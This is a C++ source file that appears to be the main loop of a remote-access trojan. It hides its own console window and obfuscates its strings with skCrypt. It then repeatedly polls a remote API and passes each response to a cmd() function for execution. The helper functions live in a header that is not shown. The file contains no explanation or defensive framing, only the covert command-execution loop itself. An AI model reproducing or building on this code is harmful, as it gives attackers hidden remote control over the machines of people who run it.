#include <windows.h>
#include <iostream>
#include <string>
#include "Functions.h"
using namespace std;

int main(int argc, char* argv[])
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char basePath[255] = "";
    _fullpath(basePath, argv[0], sizeof(basePath));
    string response = apiCall(skCrypt("check"));
    if (response == "Blacklisted") blacklisted();
    if (response == "Linked") while (true) {
        response = apiCall(skCrypt(""));
        if (response == "wait") Sleep(5000);
        if (response == "Blacklisted") blacklisted();
        if (response != "wait" && response != "Blacklisted") cmd(to_char(response));
    } else {
        notLinked(basePath);
    }
}